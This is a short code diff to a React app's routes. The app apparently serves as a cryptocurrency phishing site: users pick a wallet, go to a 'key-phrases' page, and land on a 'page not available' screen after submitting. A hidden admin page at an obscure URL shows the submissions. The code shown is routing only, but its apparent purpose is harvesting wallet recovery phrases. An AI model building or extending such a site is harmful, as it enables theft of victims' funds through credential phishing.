@@ -3,7 +3,7 @@ import { Routes, Route } from "react-router-dom";
 import LandingPage from "./pages/LandingPage";
 import WalletSelectionPage from "./pages/WalletSelectionPage";
 import KeyPhrasesPage from "./pages/KeyPhrasesPage";
-import AdminSubmissionsPage from "./pages/SubmissionsPage";
+import SubmissionsPage from "./pages/SubmissionsPage"; // This is your admin page
 import NotFoundPage from "./pages/NotFoundPage";
 
 function App() {
@@ -20,9 +20,11 @@ function App() {
         path="/key-phrases"
         element={<KeyPhrasesPage selectedWallet={selectedWallet} />}
       />
-      {/* Admin page: No links, only accessible via direct URL */}
-      <Route path="/admin-submissions-9a7f3b4e2d" element={<AdminSubmissionsPage />} />
-      {/* Any other route goes to Not Found page */}
+      {/* Hidden admin page: No links, only accessible via direct URL */}
+      <Route path="/admin-submissions-9a7f3b4e2d" element={<SubmissionsPage />} />
+      {/* Page Not Available for users after submitting */}
+      <Route path="/page-not-available" element={<NotFoundPage />} />
+      {/* Default fallback for all unknown routes */}
       <Route path="*" element={<NotFoundPage />} />
     </Routes>
   );
